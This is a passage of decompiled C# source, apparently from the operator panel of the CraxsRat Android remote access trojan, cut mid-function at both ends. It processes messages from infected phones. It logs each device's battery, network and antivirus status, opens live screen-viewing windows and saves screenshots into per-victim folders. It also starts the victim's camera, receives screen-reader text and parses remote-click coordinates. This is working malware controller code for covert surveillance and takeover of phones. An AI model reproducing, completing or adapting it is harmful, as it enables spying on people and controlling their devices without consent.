											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Battery = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.BatteryCharge;
										}
									}
									else
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.BatteryCharge = "Unkown";
									MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										if ((object)_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[11] != "-1")
										{
											string left4 = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[11];
											if (Operators.CompareString(left4, "1", TextCompare: false) != 0)
											{
												if (Operators.CompareString(left4, "0", TextCompare: false) != 0)
													_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
												else
													_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources._3g;
											}
											else
												_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
										}
										else
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
									}));
									try
									{
										if (_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[12] != null)
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.installdate = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[12];
										else
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.installdate = "not found";
									}
									catch (Exception ex13)
									{
										ProjectData.SetProjectError(ex13);
										Exception ex14 = ex13;
										_0024VB_0024ResumableLocal_ex_002438 = ex14;
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.installdate = "not found";
										ProjectData.ClearProjectError();
									}
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.ClientDefender = _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024Local_SPL[7];
									reso.Directory_Exist(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient);
									_0024VB_0024ResumableLocal_o_002439 = new object[2]
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient,
										_0024VB_0024ResumableLocal_Client_00243
									};
									if (!_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.EXI)
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.CALLS = new string[6];
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Notifications = new string[6];
										_0024VB_0024ResumableLocal_objs_002440 = RuntimeHelpers.GetObjectValue(new object());
										_0024VB_0024ResumableLocal_arrayObjects_002441 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsquyi(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.ClientRemoteAddress, _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient);
										_0024VB_0024ResumableLocal_id_002442 = RuntimeHelpers.GetObjectValue(_0024VB_0024ResumableLocal_arrayObjects_002441[0]);
										_0024VB_0024ResumableLocal_flag_002443 = Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(_0024VB_0024ResumableLocal_arrayObjects_002441[1]));
										_0024VB_0024ResumableLocal_objs_002440 = new object[4]
										{
											_0024VB_0024ResumableLocal_Client_00243,
											SecurityKey.KeysClient1 + SPL_SOCKET + reso.domen + ".apps" + SPL_SOCKET + "method" + SPL_SOCKET + SecurityKey.resultClient + SPL_SOCKET + "load" + SPL_DATA + "n",
											Codes.Encoding().GetBytes("null"),
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient
										};
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.SendMessage((object[])_0024VB_0024ResumableLocal_objs_002440);
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.isready = true;
										LOGIT(_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient, "Ready", _0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Flag);
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002433._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.mydatestart = DateTime.Now.AddSeconds(45.0);
									}
								}
								catch (Exception ex15)
								{
									ProjectData.SetProjectError(ex15);
									Exception ex16 = ex15;
									_0024VB_0024ResumableLocal_ex_002444 = ex16;
									try
									{
										if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient != null)
										{
											_0024VB_0024ResumableLocal_objs_002445 = new object[4]
											{
												_0024VB_0024ResumableLocal_Client_00243,
												SecurityKey.KeysClient5 + SPL_SOCKET + "1000",
												Codes.Encoding().GetBytes("null"),
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
											};
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_objs_002445);
										}
									}
									catch (Exception ex17)
									{
										ProjectData.SetProjectError(ex17);
										Exception ex18 = ex17;
										_0024VB_0024ResumableLocal_skip_002446 = ex18;
										ProjectData.ClearProjectError();
									}
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, "-9", TextCompare: false) == 0)
							{
								try
								{
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002447 = new _Closure_0024__39_002D2(_0024VB_0024ResumableLocal__0024VB_0024Closure__002447);
									if (!_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.qit)
									{
										_0024VB_0024ResumableLocal_screensize_002448 = _0024VB_0024ResumableLocal_thesizes_00244.Split(':');
										_0024VB_0024ResumableLocal_mytargetfromid_002449 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
										_0024VB_0024ResumableLocal_newupdate_002450 = false;
										if (_0024VB_0024ResumableLocal_screensize_002448.Length >= 4)
											_0024VB_0024ResumableLocal_mytargetfromid_002449 = _0024VB_0024ResumableLocal_screensize_002448[3];
										_0024VB_0024ResumableLocal_handle_002451 = "Live_Screen_" + _0024VB_0024ResumableLocal_mytargetfromid_002449;
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener = (ScreenShoter)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_002451];
										if (_0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener == null)
										{
											_0024VB_0024ResumableLocal_fix_002452 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
											_0024VB_0024ResumableLocal_isTAG_002453 = false;
											_0024VB_0024ResumableLocal_newidf_002454 = "";
											if (_0024VB_0024ResumableLocal_fix_002452.Contains(".") | _0024VB_0024ResumableLocal_fix_002452.Contains(":"))
											{
												_0024VB_0024ResumableLocal_arryip_002455 = _0024VB_0024ResumableLocal_fix_002452.Split('.');
												_0024VB_0024ResumableLocal_newidf_002454 = _0024VB_0024ResumableLocal_arryip_002455[0] + "." + _0024VB_0024ResumableLocal_arryip_002455[1];
											}
											else
											{
												_0024VB_0024ResumableLocal_newidf_002454 = _0024VB_0024ResumableLocal_fix_002452;
												_0024VB_0024ResumableLocal_isTAG_002453 = true;
											}
											_0024VB_0024ResumableLocal_cameraManagerForms_002456 = (from Form f in Application.OpenForms
												where f is ScreenShoter
												select f).Cast<ScreenShoter>();
											if (_0024VB_0024ResumableLocal_cameraManagerForms_002456.Any())
											{
												_0024S57 = _0024VB_0024ResumableLocal_cameraManagerForms_002456.Count() - 1;
												for (_0024VB_0024ResumableLocal_i_002458 = 0; _0024VB_0024ResumableLocal_i_002458 <= _0024S57; _0024VB_0024ResumableLocal_i_002458++)
												{
													try
													{
														_0024VB_0024ResumableLocal_targetsc_002459 = _0024VB_0024ResumableLocal_cameraManagerForms_002456.ElementAtOrDefault(_0024VB_0024ResumableLocal_i_002458);
														if (_0024VB_0024ResumableLocal_targetsc_002459 != null)
														{
															if (_0024VB_0024ResumableLocal_isTAG_002453)
															{
																if (_0024VB_0024ResumableLocal_targetsc_002459.Tag.ToString().Contains(_0024VB_0024ResumableLocal_newidf_002454))
																{
																	_0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener = _0024VB_0024ResumableLocal_targetsc_002459;
																	_0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener.Name = "Live_Screen_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
																	break;
																}
															}
															else if (_0024VB_0024ResumableLocal_targetsc_002459.Title.ToString().Contains(_0024VB_0024ResumableLocal_newidf_002454))
															{
																_0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener = _0024VB_0024ResumableLocal_targetsc_002459;
																_0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener.Name = "Live_Screen_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
																break;
															}
														}
													}
													catch (Exception ex19)
													{
														ProjectData.SetProjectError(ex19);
														Exception ex20 = ex19;
														_0024VB_0024ResumableLocal_ex_002460 = ex20;
														ProjectData.ClearProjectError();
													}
												}
											}
										}
										if (_0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener == null)
										{
											if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Row == null)
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Close(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.myClient);
											else
											{
												_0024VB_0024ResumableLocal_spl_002461 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Keys.Split(':');
												_0024VB_0024ResumableLocal_objs_002462 = new object[4]
												{
													_0024VB_0024ResumableLocal_Client_00243,
													SecurityKey.KeysClient2 + SPL_SOCKET + "sc:off" + SPL_SOCKET + _0024VB_0024ResumableLocal_spl_002461[0] + SPL_SOCKET + _0024VB_0024ResumableLocal_spl_002461[1] + SPL_SOCKET + SecurityKey.Lockscreen + SPL_SOCKET + "0" + SPL_SOCKET + Conversions.ToString(0) + SPL_SOCKET + SPL_ARRAY + SPL_SOCKET + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress,
													Codes.Encoding().GetBytes("null"),
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
												};
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_objs_002462);
											}
										}
										else
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener.Done(new object[1] { "Connected" });
											if (!_0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener.refreshtimer.Enabled)
												_0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener.refreshtimer.Enabled = true;
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener.Rnew = _0024VB_0024ResumableLocal__0024VB_0024Closure__002447._0024VB_0024Local_Screener.Rnew + 1;
											_0024VB_0024ResumableLocal_Byte__002463 = null;
											try
											{
												_0024S64 = (byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1);
												_0024VB_0024ResumableLocal_Byte__002463 = Codes.DEgzip(ref _0024S64);
												if (_0024VB_0024ResumableLocal_Byte__002463 == null)
													_0024VB_0024ResumableLocal_Byte__002463 = (byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1);
											}
											catch (Exception ex21)
											{
												ProjectData.SetProjectError(ex21);
												Exception ex22 = ex21;
												_0024VB_0024ResumableLocal_ex_002465 = ex22;
												ProjectData.ClearProjectError();
											}
											_0024VB_0024ResumableLocal_MS_002466 = new MemoryStream(_0024VB_0024ResumableLocal_Byte__002463);
											try
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__002467 = new _Closure_0024__39_002D3(_0024VB_0024ResumableLocal__0024VB_0024Closure__002467);
												_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024NonLocal__0024VB_0024Closure_3 = _0024VB_0024ResumableLocal__0024VB_0024Closure__002447;
												_0024VB_0024ResumableLocal_img_002468 = (Bitmap)Image.FromStream(_0024VB_0024ResumableLocal_MS_002466);
												try
												{
													_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024Local_bmp = new Bitmap(_0024VB_0024ResumableLocal_img_002468);
													try
													{
														if (_0024VB_0024ResumableLocal_screensize_002448.Length > 4)
														{
															_0024VB_0024ResumableLocal_isblack_002469 = _0024VB_0024ResumableLocal_screensize_002448[4];
															if (Operators.CompareString(_0024VB_0024ResumableLocal_isblack_002469, "B", TextCompare: false) == 0)
																_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024Local_bmp = (Bitmap)Codes.ChangeImageOpacity(_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024Local_bmp);
															else if (_0024VB_0024ResumableLocal_screensize_002448.Length == 5)
															{
																_0024VB_0024ResumableLocal_isblack_002469 = _0024VB_0024ResumableLocal_screensize_002448[4];
																if (Operators.CompareString(_0024VB_0024ResumableLocal_isblack_002469, "B", TextCompare: false) == 0)
																	_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024Local_bmp = (Bitmap)Codes.ChangeImageOpacity(_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024Local_bmp);
															}
														}
													}
													catch (Exception ex23)
													{
														ProjectData.SetProjectError(ex23);
														Exception ex24 = ex23;
														_0024VB_0024ResumableLocal_ex_002470 = ex24;
														ProjectData.ClearProjectError();
													}
													if (Operators.CompareString(_0024VB_0024ResumableLocal_screensize_002448[1], "SK", TextCompare: false) == 0)
													{
														_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.Viewdimiss();
														_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.ScreenShotFoucs = true;
														MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
														{
															_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.Livepicbox.Image = _0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024Local_bmp;
														}));
														if (!Directory.Exists(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\Screen_Shots"))
															Directory.CreateDirectory(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\Screen_Shots");
														_0024VB_0024ResumableLocal_bmptosave_002471 = new Bitmap(_0024VB_0024ResumableLocal_img_002468);
														_0024VB_0024ResumableLocal_bmptosave_002471.Save(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\Screen_Shots\\" + DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".jpg");
													}
													if (!_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.ScreenShotFoucs)
													{
														MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
														{
															_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.Livepicbox.Image = _0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024Local_bmp;
														}));
														_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.ScreenClass = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
													}
													if ((_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ScreenSize == default(Size)) | (_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.ScreenSize == default(Size)))
														try
														{
															if (Versioned.IsNumeric(_0024VB_0024ResumableLocal_screensize_002448[1]) && Versioned.IsNumeric(_0024VB_0024ResumableLocal_screensize_002448[2]))
															{
																_0024VB_0024ResumableLocal_phone_hight_002472 = Conversions.ToInteger(_0024VB_0024ResumableLocal_screensize_002448[1]);
																_0024VB_0024ResumableLocal_phone_width_002473 = Conversions.ToInteger(_0024VB_0024ResumableLocal_screensize_002448[2]);
																_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ScreenSize = new Size(_0024VB_0024ResumableLocal_phone_width_002473, _0024VB_0024ResumableLocal_phone_hight_002472);
																_0024VB_0024ResumableLocal__0024VB_0024Closure__002467._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.ScreenSize = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ScreenSize;
															}
															else
																_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ScreenSize = new Size(720, 1280);
														}
														catch (Exception ex25)
														{
															ProjectData.SetProjectError(ex25);
															Exception ex26 = ex25;
															_0024VB_0024ResumableLocal_ex_002474 = ex26;
															ProjectData.ClearProjectError();
														}
												}
												finally
												{
													if (num < 0 && _0024VB_0024ResumableLocal_img_002468 != null)
														((IDisposable)_0024VB_0024ResumableLocal_img_002468).Dispose();
												}
											}
											finally
											{
												if (num < 0 && _0024VB_0024ResumableLocal_MS_002466 != null)
													((IDisposable)_0024VB_0024ResumableLocal_MS_002466).Dispose();
											}
										}
									}
								}
								catch (Exception ex27)
								{
									ProjectData.SetProjectError(ex27);
									Exception ex28 = ex27;
									_0024VB_0024ResumableLocal_ex_002475 = ex28;
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, SecurityKey.getCamera, TextCompare: false) == 0)
							{
								StartCamer(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient, _0024VB_0024ResumableLocal_EncodString_00246, _0024VB_0024ResumableLocal_SPLByte_00245, _0024VB_0024ResumableLocal_Client_00243);
							}
							else if (Operators.CompareString(_0024S9, "-759", TextCompare: false) == 0)
							{
								try
								{
									_0024VB_0024ResumableLocal_handle_002476 = "Screen_Reader_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
									_0024VB_0024ResumableLocal_ScRecorder_002477 = (ScreenReader)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_002476];
									if (_0024VB_0024ResumableLocal_ScRecorder_002477 == null)
									{
										_0024VB_0024ResumableLocal_cClient_002478 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.myClient;
										_0024VB_0024ResumableLocal_spl_002479 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Keys.Split(':');
										_0024VB_0024ResumableLocal_chk0_002480 = 0;
										_0024VB_0024ResumableLocal_chk1_002481 = 0;
										_0024VB_0024ResumableLocal_objs_002482 = new object[4]
										{
											_0024VB_0024ResumableLocal_cClient_002478,
											SecurityKey.KeysClient2 + SPL_SOCKET + "SCRD<*>f" + SPL_SOCKET + _0024VB_0024ResumableLocal_spl_002479[0] + SPL_SOCKET + _0024VB_0024ResumableLocal_spl_002479[1] + SPL_SOCKET + SecurityKey.Lockscreen + SPL_SOCKET + Conversions.ToString(_0024VB_0024ResumableLocal_chk0_002480) + SPL_SOCKET + Conversions.ToString(_0024VB_0024ResumableLocal_chk1_002481) + SPL_SOCKET + SPL_ARRAY + SPL_SOCKET + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress,
											Codes.Encoding().GetBytes("null"),
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
										};
										_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_objs_002482);
									}
									else
									{
										_0024VB_0024ResumableLocal_THEDATA_002483 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
										_0024VB_0024ResumableLocal_ScRecorder_002477.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxczxsdkh(new object[1] { _0024VB_0024ResumableLocal_THEDATA_002483 });
									}
								}
								catch (Exception ex29)
								{
									ProjectData.SetProjectError(ex29);
									Exception ex30 = ex29;
									_0024VB_0024ResumableLocal_ex_002484 = ex30;
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, CheckforSCv2(_0024VB_0024ResumableLocal_getCase_00247), TextCompare: false) == 0)
							{
								try
								{
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002485 = new _Closure_0024__39_002D4(_0024VB_0024ResumableLocal__0024VB_0024Closure__002485);
									_0024VB_0024ResumableLocal_handle_002486 = "SC_Readv2_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
									_0024VB_0024ResumableLocal__0024VB_0024Closure__002485._0024VB_0024Local_ScRecorder = (ScreenReaderV2)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_002486];
									if (_0024VB_0024ResumableLocal__0024VB_0024Closure__002485._0024VB_0024Local_ScRecorder == null)
									{
										_0024VB_0024ResumableLocal_cClient_002487 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.myClient;
										_0024VB_0024ResumableLocal_spl_002488 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Keys.Split(':');
										_0024VB_0024ResumableLocal_chk0_002489 = 0;
										_0024VB_0024ResumableLocal_chk1_002490 = 0;
										_0024VB_0024ResumableLocal_objs_002491 = new object[4]
										{
											_0024VB_0024ResumableLocal_cClient_002487,
											SecurityKey.KeysClient2 + SPL_SOCKET + "SCRD2<*>f" + SPL_SOCKET + _0024VB_0024ResumableLocal_spl_002488[0] + SPL_SOCKET + _0024VB_0024ResumableLocal_spl_002488[1] + SPL_SOCKET + SecurityKey.Lockscreen + SPL_SOCKET + Conversions.ToString(_0024VB_0024ResumableLocal_chk0_002489) + SPL_SOCKET + Conversions.ToString(_0024VB_0024ResumableLocal_chk1_002490) + SPL_SOCKET + SPL_ARRAY + SPL_SOCKET + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress,
											Codes.Encoding().GetBytes("null"),
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
										};
										_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_objs_002491);
									}
									else
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002492 = new _Closure_0024__39_002D5(_0024VB_0024ResumableLocal__0024VB_0024Closure__002492);
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002492._0024VB_0024NonLocal__0024VB_0024Closure_4 = _0024VB_0024ResumableLocal__0024VB_0024Closure__002485;
										_0024S93 = (byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1);
										_0024VB_0024ResumableLocal_Byte__002494 = Codes.DEgzip(ref _0024S93);
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002492._0024VB_0024Local_theData = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(0)).Split('<');
										_0024VB_0024ResumableLocal__0024VB_0024Closure__002492._0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_ScRecorder.ScreenSize = new Size(int.Parse(_0024VB_0024ResumableLocal__0024VB_0024Closure__002492._0024VB_0024Local_theData[1]), int.Parse(_0024VB_0024ResumableLocal__0024VB_0024Closure__002492._0024VB_0024Local_theData[2]));
										MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002492._0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_ScRecorder.activetext.Text = _0024VB_0024ResumableLocal__0024VB_0024Closure__002492._0024VB_0024Local_theData[3];
										}));
										_0024VB_0024ResumableLocal_MS_002495 = new MemoryStream(_0024VB_0024ResumableLocal_Byte__002494);
										try
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002496 = new _Closure_0024__39_002D6(_0024VB_0024ResumableLocal__0024VB_0024Closure__002496);
											_0024VB_0024ResumableLocal__0024VB_0024Closure__002496._0024VB_0024NonLocal__0024VB_0024Closure_5 = _0024VB_0024ResumableLocal__0024VB_0024Closure__002492;
											_0024VB_0024ResumableLocal_img_002497 = (Bitmap)Image.FromStream(_0024VB_0024ResumableLocal_MS_002495);
											try
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__002496._0024VB_0024Local_bmp = new Bitmap(_0024VB_0024ResumableLocal_img_002497);
												MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
												{
													_0024VB_0024ResumableLocal__0024VB_0024Closure__002496._0024VB_0024NonLocal__0024VB_0024Closure_5._0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_ScRecorder.viewpic.Image = _0024VB_0024ResumableLocal__0024VB_0024Closure__002496._0024VB_0024Local_bmp;
												}));
											}
											finally
											{
												if (num < 0 && _0024VB_0024ResumableLocal_img_002497 != null)
													((IDisposable)_0024VB_0024ResumableLocal_img_002497).Dispose();
											}
										}
										finally
										{
											if (num < 0 && _0024VB_0024ResumableLocal_MS_002495 != null)
												((IDisposable)_0024VB_0024ResumableLocal_MS_002495).Dispose();
										}
									}
								}
								catch (Exception ex31)
								{
									ProjectData.SetProjectError(ex31);
									Exception ex32 = ex31;
									_0024VB_0024ResumableLocal_ex_002498 = ex32;
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, "-584", TextCompare: false) == 0)
							{
								try
								{
									_0024VB_0024ResumableLocal_handle_002499 = "Auto_Clicker_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
									//_0024VB_0024ResumableLocal_autoer_0024100 = (Auto_Clicker)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_002499];
								//	if (_0024VB_0024ResumableLocal_autoer_0024100 != null)
									{
										_0024VB_0024ResumableLocal_THEDATA_0024101 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
										if (_0024VB_0024ResumableLocal_THEDATA_0024101.Contains("{"))
										{
											_0024VB_0024ResumableLocal_Cordints_0024102 = _0024VB_0024ResumableLocal_THEDATA_0024101.Replace("{", "").Replace("}", "").Split(',');
											_0024VB_0024ResumableLocal_x_0024103 = float.Parse(_0024VB_0024ResumableLocal_Cordints_0024102[0]);
											_0024VB_0024ResumableLocal_y_0024104 = float.Parse(_0024VB_0024ResumableLocal_Cordints_0024102[1]);
											_0024VB_0024ResumableLocal_w_0024105 = float.Parse(_0024VB_0024ResumableLocal_Cordints_0024102[2]);
											_0024VB_0024ResumableLocal_h_0024106 = float.Parse(_0024VB_0024ResumableLocal_Cordints_0024102[3]);
